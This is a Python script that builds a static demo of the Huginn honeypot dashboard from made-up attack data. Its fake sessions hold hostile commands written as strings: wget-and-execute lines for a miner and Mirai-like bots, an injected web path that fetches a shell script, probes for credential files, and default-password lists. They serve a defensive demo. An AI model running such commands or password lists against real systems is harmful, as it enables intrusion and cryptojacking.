#!/usr/bin/env python3
# make_demo.py — build a static, read-only demo of Huginn with MADE-UP data (part of Huginn, AGPL-3.0-or-later).
#
#   python3 tools/make_demo.py OUTDIR [--base /huginn/] [--seed 7]
#
# Every attacker address, network and AS number comes from the ranges reserved for documentation
# (RFC 5737, RFC 3849, RFC 5398), so none of it belongs to a real person or company.
# The pages are rendered by Huginn itself and saved as plain HTML, so any static web host can serve them.
import argparse, hashlib, json, os, random, re, shutil, sys, tempfile, time, urllib.parse

ap = argparse.ArgumentParser()
ap.add_argument("out")
ap.add_argument("--base", default="/huginn/", help="URL path the demo is served under (default /huginn/)")
ap.add_argument("--seed", type=int, default=7)
ap.add_argument("--github", default="https://github.com/ancientswede/Huginn")
args = ap.parse_args()
BASE = "/" + args.base.strip("/") + "/" if args.base.strip("/") else "/"

work = tempfile.mkdtemp(prefix="huginn-demo-")
os.environ.update({"HUGINN_BASE": work, "HUGINN_DEMO": "1", "HUGINN_TZ": "UTC", "HUGINN_ENRICH": "0",
                   "HUGINN_PERSONAS": "2225=server,2323=camera", "HUGINN_HP_HOST": "honeypot.example",
                   "HUGINN_BAIT_FILE": os.path.join(work, "bait.json")})
BAIT = {"mysql_backup": "Bk7-demo-Backup!9", "redis": "rds-demo-31c9f0a2e7b4", "aws_secret": "demoAWSsecretKEY0000000000000000000000000"}
json.dump(BAIT, open(os.path.join(work, "bait.json"), "w"))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
import app  # noqa: E402

R = random.Random(args.seed)
NOW = time.time()
app.init_db()
con = app.connect()


def hx(n):
    return "".join(R.choice("0123456789abcdef") for _ in range(n))


# ------------------------------------------------------------------ made-up world
POOL = ["192.0.2.%d" % i for i in range(1, 255)] + ["198.51.100.%d" % i for i in range(1, 255)] + ["203.0.113.%d" % i for i in range(1, 255)]
R.shuffle(POOL)
COUNTRIES = [("US", "United States", 18), ("CN", "China", 12), ("DE", "Germany", 8), ("NL", "Netherlands", 8), ("RU", "Russia", 6),
             ("BR", "Brazil", 6), ("IN", "India", 5), ("VN", "Vietnam", 5), ("KR", "South Korea", 4), ("FR", "France", 4),
             ("GB", "United Kingdom", 4), ("SG", "Singapore", 4), ("ID", "Indonesia", 3), ("AR", "Argentina", 3), ("RO", "Romania", 3),
             ("UA", "Ukraine", 2), ("TW", "Taiwan", 2), ("HK", "Hong Kong", 2), ("JP", "Japan", 2), ("TR", "Turkey", 2), ("IR", "Iran", 2),
             ("MX", "Mexico", 2), ("ZA", "South Africa", 1), ("PL", "Poland", 1), ("BG", "Bulgaria", 1), ("CA", "Canada", 2), ("SE", "Sweden", 1),
             ("IT", "Italy", 1), ("TH", "Thailand", 1), ("CO", "Colombia", 1)]
ORGS = ["Example Cloud Ltd", "Demo Hosting GmbH", "Sample Telecom", "Placeholder Networks", "Fictional Data Centers", "Mock ISP Co",
        "Illustrative Broadband", "Testbed Servers LLC", "Nowhere Online", "Imaginary VPS", "Lorem Ipsum Hosting", "Specimen Mobile"]
ASNS = [str(a) for a in list(range(64496, 64512)) + list(range(65536, 65552))]


def country():
    t = sum(w for _, _, w in COUNTRIES)
    x = R.uniform(0, t)
    for cc, name, w in COUNTRIES:
        x -= w
        if x <= 0:
            return cc, name
    return COUNTRIES[0][:2]


rows = []


def ev(ts, ip, src, kind, session=None, a=None, b=None):
    rows.append((hx(40), ts, ip, src, kind, session, a, b))


def rnd_ts(days=14):
    return NOW - R.uniform(0, days) * 86400 - R.uniform(0, 3600)


PASSWORDS = ["123456", "admin", "root", "password", "12345678", "1234", "qwerty", "toor", "raspberry", "ubuntu", "test", "admin123",
             "P@ssw0rd", "changeme", "default", "xc3511", "vizxv", "888888", "support", "user", "oracle", "1qaz2wsx", "pi", "guest"]
USERS = ["root"] * 8 + ["admin"] * 3 + ["ubuntu", "pi", "test", "user", "oracle", "git", "postgres", "support", "guest", "deploy"]
SSH_CLIENTS = [("SSH-2.0-Go", "0a07365cc01fa9fc82608ba4019af499"), ("SSH-2.0-libssh_0.9.6", "f555226df1963d1d3c09daf865abdc9a"),
               ("SSH-2.0-paramiko_3.4.0", "2ec37a7cc8daf20b10e1ad6221061ca5"), ("SSH-2.0-OpenSSH_8.4p1", "ec7378c1a92f5a8dde7e8b7a1ddf33d1"),
               ("SSH-2.0-PUTTY", "b5752e36ba6c5979a575e43178908adf")]
RECON = ["uname -a", "uname -s -v -n -r -m", "cat /proc/cpuinfo | grep name | wc -l", "nproc", "free -m", "whoami", "id",
         "cat /etc/issue", "ls -la", "crontab -l", "w", "lscpu | grep Model", "df -h", "echo xsec"]
FILES = [
    {"sha": hashlib.sha256(b"demo-miner-x86").hexdigest(), "type": "ELF 64-bit", "arch": "x86-64", "size": 3392 * 1024, "packed": 0,
     "iocs": ["http://203.0.113.200/xmr/config.json", "203.0.113.201:3333", "https://pool.example.net:443"], "name": ".16"},
    {"sha": hashlib.sha256(b"demo-bot-arm7").hexdigest(), "type": "ELF 32-bit", "arch": "arm", "size": 29 * 1024, "packed": 1,
     "iocs": ["203.0.113.66:23", "198.51.100.250"], "name": "/tmp/.d"},
    {"sha": hashlib.sha256(b"demo-bot-mips").hexdigest(), "type": "ELF 32-bit", "arch": "mips", "size": 27 * 1024, "packed": 1,
     "iocs": ["203.0.113.66:23"], "name": "/var/tmp/.m"},
    {"sha": hashlib.sha256(b"demo-dropper-sh").hexdigest(), "type": "script (/bin/sh)", "arch": "", "size": 812, "packed": 0,
     "iocs": ["http://203.0.113.66/bins/arm7", "http://203.0.113.66/bins/mips"], "name": "/tmp/.b"},
    {"sha": hashlib.sha256(b"demo-stealer").hexdigest(), "type": "ELF 64-bit", "arch": "x86-64", "size": 29594 * 1024, "packed": 0,
     "iocs": ["https://hooks.example.org/api/webhooks/000000/demo", "198.51.100.77:8443"], "name": "sshd"},
]
WEB_PATHS = ["/.env", "/wp-login.php", "/cgi-bin/luci/;stok=/locale", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
             "/.git/config", "/admin/config.php", "/boaform/admin/formLogin", "/HNAP1/", "/actuator/health", "/solr/admin/info/system",
             "/shell?cd+/tmp;wget+http://203.0.113.66/x.sh", "/.aws/credentials", "/phpmyadmin/", "/server-status", "/xmlrpc.php"]
UAS = ["Mozilla/5.0 zgrab/0.x", "python-requests/2.31.0", "curl/8.4.0", "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
       "Go-http-client/1.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]
TTY = {}


def session(ip, ts, proto, port, client=None, logins=(), cmds=(), gap=(0.05, 0.4), file=None, tcpip=(), exploit=None, record=False):
    sid = hx(12)
    t = ts
    ev(t, ip, "cowrie", "connect", sid, proto, str(port))
    if client:
        ev(t + 0.1, ip, "cowrie", "version", sid, client[0])
        ev(t + 0.2, ip, "cowrie", "hassh", sid, client[1])
    t += 0.5
    for u, p, ok in logins:
        t += R.uniform(0.3, 2)
        ev(t, ip, "cowrie", "login_ok" if ok else "login_fail", sid, u, p)
    out = []
    for c in cmds:
        t += R.uniform(*gap)
        ev(t, ip, "cowrie", "cmd", sid, c)
        out.append([round(t - ts, 2), "root@%s:~# %s\r\n" % ("db01" if port == 2225 else "cam01", c)])
    if exploit:
        ev(t + 0.2, ip, "cowrie", "exploit", sid, exploit, "USER=-f root")
    if file:
        t += R.uniform(1, 4)
        ev(t, ip, "cowrie", "file", sid, file["name"], file["sha"])
    for dst in tcpip:
        t += 0.3
        ev(t, ip, "cowrie", "tcpip", sid, dst)
    t += R.uniform(0.2, 3)
    if record and cmds:
        sha = hashlib.sha256(("tty" + sid).encode()).hexdigest()
        out.append([round(t - ts, 2), "logout\r\n"])
        TTY[sha] = out
        ev(t, ip, "cowrie", "tty", sid, sha, str(len(json.dumps(out))))
    ev(t, ip, "cowrie", "closed", sid, str(round(t - ts, 3)))
    return t


ips = {}


def new_ip(kind, research=False):
    ip = POOL.pop()
    cc, name = country()
    org = R.choice(ORGS)
    rdns = ("scanner-%d.example-research.net" % R.randint(1, 99)) if research else (R.choice(["", "", "host-%s.example.net" % ip.replace(".", "-"), "vps%d.example.com" % R.randint(10, 999)]))
    ips[ip] = dict(cc=cc, country=name, org=("Example Research Project" if research else org), asn=R.choice(ASNS), rdns=rdns or None, kind=kind)
    return ip


# 1. Scanners: connect, read the banner, maybe one try
for _ in range(110):
    ip = new_ip("scanner")
    for _ in range(R.randint(1, 4)):
        session(ip, rnd_ts(), "ssh", 2225, R.choice(SSH_CLIENTS), logins=[(R.choice(USERS), R.choice(PASSWORDS), False)] if R.random() < .4 else [])
# 2. Research scanners
for _ in range(14):
    ip = new_ip("research", research=True)
    for _ in range(R.randint(1, 3)):
        session(ip, rnd_ts(), "ssh", 2225, ("SSH-2.0-Go", "0a07365cc01fa9fc82608ba4019af499"))
# 3. Brute forcers that check uname and leave
for _ in range(80):
    ip = new_ip("brute")
    cl = R.choice(SSH_CLIENTS)
    for _ in range(R.randint(3, 25)):
        ok = R.random() < .3
        session(ip, rnd_ts(), "ssh", 2225, cl, logins=[(R.choice(USERS), R.choice(PASSWORDS), ok)],
                cmds=[R.choice(["uname -s -v -n -r -m", "echo xsec", "uname -a"])] if ok else [])
# 4. One botnet campaign: 26 IPs, same client, identical script, same miner
CAMP = ["uname -s -m", "cat /proc/cpuinfo | grep name | wc -l", "nproc", "free -m", "cd /tmp", "wget -q http://203.0.113.200/x86 -O .16",
        "chmod +x .16", "./.16 -c config.json", "crontab -l", "history -c"]
for i in range(26):
    ip = new_ip("campaign")
    session(ip, rnd_ts(6), "ssh", 2225, SSH_CLIENTS[0], logins=[("root", R.choice(PASSWORDS), True)], cmds=CAMP, file=FILES[0], record=(i < 4))
# 5. Mirai-like telnet bots against the camera
MIRAI = ["enable", "system", "shell", "sh", "/bin/busybox ECCHI", "cd /tmp || cd /var/run || cd /mnt", "/bin/busybox wget http://203.0.113.66/bins/arm7 -O .d",
         "chmod 777 .d", "./.d telnet.arm7", "/bin/busybox ECCHI"]
for i in range(40):
    ip = new_ip("mirai")
    f = FILES[1] if i % 3 else FILES[2]
    session(ip, rnd_ts(), "telnet", 2323, None, logins=[(R.choice(["root", "admin", "support"]), R.choice(["xc3511", "vizxv", "admin", "888888", "default"]), True)],
            cmds=MIRAI, file=f if R.random() < .6 else None, exploit=("CVE-2026-24061" if R.random() < .15 else None), record=(i < 3))
# 6. Proxy abusers
for _ in range(12):
    ip = new_ip("proxy")
    session(ip, rnd_ts(), "ssh", 2225, SSH_CLIENTS[2], logins=[("root", "admin", True)], tcpip=[R.choice(["198.51.100.53:53", "example.com:443", "203.0.113.25:25", "198.51.100.9:2535"]) for _ in range(R.randint(1, 5))])
# 7. Web scanners on 80/443
for _ in range(45):
    ip = new_ip("web")
    ua = R.choice(UAS)
    for _ in range(R.randint(1, 12)):
        svc = R.choice(["http", "https"])
        path = R.choice(WEB_PATHS)
        b = "%s %s (404)  · %s" % ("POST" if "eval-stdin" in path or "formLogin" in path else "GET", path, ua)
        if "formLogin" in path:
            b = "POST %s (404)  body: username=admin&psd=admin  · %s" % (path, ua)
        ev(rnd_ts(), ip, "canary", "canary", None, svc, b)
# 8. VNC / Redis / MySQL / FTP brute force
for _ in range(30):
    ip = new_ip("canary")
    svc = R.choice(["vnc", "vnc", "redis", "mysql", "ftp"])
    for _ in range(R.randint(2, 40)):
        if svc == "redis":
            b = json.dumps({"CMD": R.choice(["AUTH", "INFO", "CONFIG"]), "ARGS": R.choice(["", "foobared", "default"])})
        elif svc in ("ftp", "mysql"):
            b = "%s / %s" % (R.choice(USERS), R.choice(PASSWORDS))
        else:
            b = json.dumps({"VNC Password": "<Password was not in the common list>"})
        ev(rnd_ts(), ip, "canary", "canary", None, svc, b)
# 9. Spam relay and mail brute force (hp-traps)
for _ in range(10):
    ip = new_ip("mail")
    for _ in range(R.randint(1, 6)):
        ts = rnd_ts()
        ev(ts, ip, "traps", "canary", None, "smtp", "")
        ev(ts + 1, ip, "traps", "canary", None, "smtp", "%s / %s" % (R.choice(["info@example.com", "admin", "test"]), R.choice(PASSWORDS)))
        if R.random() < .5:
            ev(ts + 3, ip, "traps", "canary", None, "smtp", "relay: <offers@example.org> -> %d recipient(s): Your account statement" % R.randint(1, 40))
for _ in range(8):
    ip = new_ip("mailbrute")
    for _ in range(R.randint(3, 20)):
        ev(rnd_ts(), ip, "traps", "canary", None, R.choice(["pop3", "imap", "postgres", "socks5"]), "%s / %s" % (R.choice(USERS), R.choice(PASSWORDS)))
# 10. Stuck in the tarpit
for _ in range(25):
    ip = new_ip("tarpit")
    for _ in range(R.randint(1, 4)):
        ts = rnd_ts()
        port = str(R.randint(20000, 65000))
        ev(ts, ip, "endlessh", "tarpit_open", None, port)
        ev(ts + 1, ip, "endlessh", "tarpit", None, str(round(R.uniform(15, 3600), 3)), port)
# 11. Two humans who read the bait — one of them tried the stolen password on the fake MySQL
for i in range(2):
    ip = new_ip("human")
    cmds = ["w", "ls -la", "cat .bash_history", "cat /var/www/portal/.env", "cat ~/.my.cnf", "mysql -u backup -p'%s' -h 10.40.8.12" % BAIT["mysql_backup"], "exit"]
    session(ip, rnd_ts(3), "ssh", 2225, SSH_CLIENTS[3], logins=[("root", "Summer2026!", True)], cmds=cmds if i == 0 else cmds[:5], gap=(3, 14), record=True)
    if i == 0:
        ev(rnd_ts(2), ip, "canary", "canary", None, "redis", json.dumps({"CMD": "AUTH", "ARGS": BAIT["redis"]}))

app.store(con, rows)
app.store_files(con, [{"sha": f["sha"], "src": "redir" if "script" in f["type"] else "download", "size": f["size"], "type": f["type"],
                       "arch": f["arch"], "packed": f["packed"], "iocs": f["iocs"], "mtime": NOW - R.uniform(0, 5) * 86400} for f in FILES])
with con:
    for ip, d in ips.items():
        con.execute("INSERT OR REPLACE INTO enrich(ip,fetched,ok,cc,country,city,asn,org,isp,rdns,ports,tags,vulns,hostnames,research) "
                    "VALUES(?,?,1,?,?,NULL,?,?,?,?,?,?,?,NULL,?)",
                    (ip, NOW, d["cc"], d["country"], d["asn"], d["org"], d["org"], d["rdns"],
                     ",".join(str(p) for p in R.sample([22, 23, 80, 443, 8080, 2323, 5900, 7547], R.randint(0, 3))),
                     "", R.choice(["", "", "CVE-2023-38408"]), 1 if d["kind"] == "research" else 0))
    first_camp = next(ip for ip, d in ips.items() if d["kind"] == "campaign")
    con.execute("INSERT OR REPLACE INTO flags VALUES(?,?,?,?)", (first_camp, "block", "Miner campaign, block for good", NOW))
    research = next(ip for ip, d in ips.items() if d["kind"] == "research")
    con.execute("INSERT OR REPLACE INTO flags VALUES(?,?,?,?)", (research, "allow", "Known research scanner", NOW))
for ip in ips:
    with con:
        app.recompute_ip(con, ip)
app.set_meta(con, "last_ingest", NOW - 40)
app.set_meta(con, "last_ingest_new", 212)
app.set_meta(con, "feed_token", "demo-token-not-real")
print("demo data: %d IPs, %d events, %d sessions" % (len(ips), con.execute("SELECT COUNT(*) FROM events").fetchone()[0],
                                                     con.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]))

# ------------------------------------------------------------------ render to static files
OUT = os.path.abspath(args.out)
shutil.rmtree(OUT, ignore_errors=True)
os.makedirs(OUT)
pages = {}


def P(path):
    return BASE + path


def link(m):
    attr, q, url = m.group(1), m.group(2), m.group(3)
    if not url.startswith("/") or url.startswith("//"):
        return m.group(0)
    u = urllib.parse.urlsplit(url)
    path, qs, frag = u.path, dict(urllib.parse.parse_qsl(u.query)), ("#" + u.fragment if u.fragment else "")
    target = None
    if path == "/":
        target = "index.html"
    elif path == "/ips":
        if qs.get("cc"):
            target = "ips-cc-%s.html" % qs["cc"].upper()
        elif qs.get("p") and qs.get("p") != "0":
            target = "ips-p%s.html" % qs["p"]
        else:
            target = "ips.html"
    elif re.fullmatch(r"/ip/[0-9a-fA-F.:]+", path):
        target = "ip/%s.html" % path[4:]
    elif path.startswith("/replay/"):
        target = "replay/%s.html" % path[8:]
    elif re.fullmatch(r"/campaign/(script|hassh|file)/[0-9a-f]+", path):
        target = path[1:] + ".html"
    elif path in ("/campaigns", "/files", "/creds", "/blocklist", "/settings"):
        target = path[1:] + ".html"
    elif path.startswith("/static/"):
        target = path[1:]
    elif path == "/api/creds-check/":
        target = "api/creds-check/"
    elif path.startswith("/api/tty/"):
        target = "api/tty/%s.json" % path[9:]
    if target is None:
        return '%s=%s#%s' % (attr, q, q)          # account, exports, feeds, logout: not part of the demo
    return "%s=%s%s%s%s" % (attr, q, P(target), frag, q)


BANNER = ('<div class="demo-banner">Demo with made-up data &middot; Huginn turns a homelab honeypot into a page per attacker and firewall '
          'blocklists &middot; <a href="%s" target="_blank" rel="noopener">Get it on GitHub</a></div>' % args.github)


def fix(html):
    html = re.sub(r"""(href|src|action|data-src)=(["'])(.*?)\2""", link, html)
    html = html.replace("<body>", "<body>" + BANNER, 1).replace("<body class=login>", "<body class=login>" + BANNER, 1)
    html = re.sub(r"<a class='hdr-link' href=[^>]*>Account</a>", "", html)
    html = re.sub(r"<form method=post action='[^']*'><button class=link>Log out</button></form>", "", html)
    return html


def save(rel, content):
    p = os.path.join(OUT, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8") as fh:
        fh.write(content)
    pages[rel] = len(content)


class FakeHandler:
    client_address = ("127.0.0.1", 0)
    headers = {"Host": "your-huginn:8095"}


app._local.h12 = False
save("index.html", fix(app.v_overview()))
save("ips.html", fix(app.v_ips({"days": "30"})))
total = con.execute("SELECT COUNT(*) FROM ips WHERE last>=?", (NOW - 30 * 86400,)).fetchone()[0]
for p in range(1, (total + 99) // 100):
    save("ips-p%d.html" % p, fix(app.v_ips({"days": "30", "p": str(p)})))
for (cc,) in con.execute("SELECT DISTINCT cc FROM enrich WHERE cc IS NOT NULL"):
    save("ips-cc-%s.html" % cc, fix(app.v_ips({"days": "7", "cc": cc})))
for (ip,) in con.execute("SELECT ip FROM ips"):
    save("ip/%s.html" % ip, fix(app.v_ip(ip)))
save("campaigns.html", fix(app.v_campaigns()))
for kind, sql in (("script", "SELECT DISTINCT cmdhash FROM sessions WHERE cmdhash IS NOT NULL"),
                  ("hassh", "SELECT DISTINCT hassh FROM sessions WHERE hassh IS NOT NULL"),
                  ("file", "SELECT DISTINCT b FROM events WHERE kind='file' AND b IS NOT NULL")):
    for (v,) in con.execute(sql):
        out = app.v_campaign(kind, v)
        if out:
            save("campaign/%s/%s.html" % (kind, v), fix(out))
save("files.html", fix(app.v_files()))
# The password check works in the demo too: one static answer per hash prefix (missing prefix = not found).
creds = fix(app.v_creds({"days": "7"}))
creds = re.sub(r'<div class="card"><h3>Search and export</h3>.*?</div></div>',
               '<div class="card"><h3>Search and export</h3><p class="muted">In your own Huginn: search every username and password, '
               'and export them as word lists or CSV.</p><p class="muted small">Try the check on the left with a common password like '
               '<span class=mono>123456</span> or <span class=mono>admin</span>.</p></div></div>', creds, count=1, flags=re.S)
save("creds.html", creds)
for prefix in app.cred_index(con)["buckets"]:
    save("api/creds-check/%s.json" % prefix, json.dumps(app.cred_check(con, prefix)))
save("blocklist.html", fix(app.v_blocklist(FakeHandler(), {})))
save("settings.html", fix(app.v_settings()))
for sha, frames in TTY.items():
    out = app.v_replay(sha, "")
    if out:
        save("replay/%s.html" % sha, fix(out))
        save("api/tty/%s.json" % sha, json.dumps({"frames": frames}))

# static files: the app's own CSS/JS/icon, patched for a read-only static site
js = app.JS
js = js.replace("location.href='/ips?days=7&cc='+cc", "location.href='%sips-cc-'+cc+'.html'" % BASE)
js = js.replace("fetch('/static/world-map.json')", "fetch('%sstatic/world-map.json')" % BASE)
js = js.replace("map={o:'/',a:'/ips',c:'/campaigns',f:'/files',r:'/creds',b:'/blocklist',s:'/settings'}",
                "map={o:'%(b)sindex.html',a:'%(b)sips.html',c:'%(b)scampaigns.html',f:'%(b)sfiles.html',r:'%(b)screds.html',b:'%(b)sblocklist.html',s:'%(b)ssettings.html'}" % {"b": BASE})
js = js.replace("if(f)f.submit()", "if(f)(f.requestSubmit?f.requestSubmit():f.submit())")
js += r"""
(function(){var order=['auto','light','dark'];function apply(t){var h=document.documentElement;if(t==='auto')h.removeAttribute('data-theme');else h.setAttribute('data-theme',t);
var b=document.querySelector('.theme-btn');if(b){b.lastChild.textContent=t.charAt(0).toUpperCase()+t.slice(1);var i=b.querySelector('.ti');if(i)i.className='ti ti-'+t}}
var cur='auto';try{cur=localStorage.getItem('hgDemoTheme')||'auto'}catch(e){}apply(cur);
var note=null;function toast(m){if(!note){note=document.createElement('div');note.className='demo-toast';document.body.appendChild(note)}note.textContent=m;note.classList.add('on');clearTimeout(note._t);note._t=setTimeout(function(){note.classList.remove('on')},2400)}
document.addEventListener('submit',function(e){e.preventDefault();if(e.target.id==='pwcheck')return;var a=e.target.getAttribute('action')||'';
if(a.indexOf('theme')>=0||e.target.querySelector('.theme-btn')){cur=order[(order.indexOf(cur)+1)%3];apply(cur);try{localStorage.setItem('hgDemoTheme',cur)}catch(x){}return}
toast('This is a read-only demo — install Huginn to use filters and settings.')},true);
document.addEventListener('click',function(e){var a=e.target.closest('a');if(a&&a.getAttribute('href')==='#'){e.preventDefault();toast('Not available in the demo.')}})})();
"""
css = app.CSS + (".demo-banner{background:#2f5bb7;color:#fff;text-align:center;padding:7px 16px;font-size:13px}"
                 ".demo-banner a{color:#fff;text-decoration:underline;font-weight:600}"
                 ".demo-toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%) translateY(20px);opacity:0;background:var(--text);color:var(--bg);"
                 "padding:9px 16px;border-radius:8px;font-size:13px;transition:all .2s;z-index:60;pointer-events:none}.demo-toast.on{opacity:1;transform:translateX(-50%)}")
save("static/app.css", css)
save("static/app.js", js)
save("static/icon.svg", app.ICON)
shutil.copy(os.path.join(os.path.dirname(os.path.abspath(app.__file__)), "static", "world-map.json"), os.path.join(OUT, "static", "world-map.json"))
shutil.copy(os.path.join(os.path.dirname(os.path.abspath(app.__file__)), "static", "world-map.LICENSE.md"), os.path.join(OUT, "static", "world-map.LICENSE.md"))
save("robots.txt", "User-agent: *\nDisallow:\n")
shutil.rmtree(work, ignore_errors=True)
print("wrote %d files, %.1f MB to %s (base %s)" % (len(pages) + 2, sum(pages.values()) / 1048576 + 0.3, OUT, BASE))
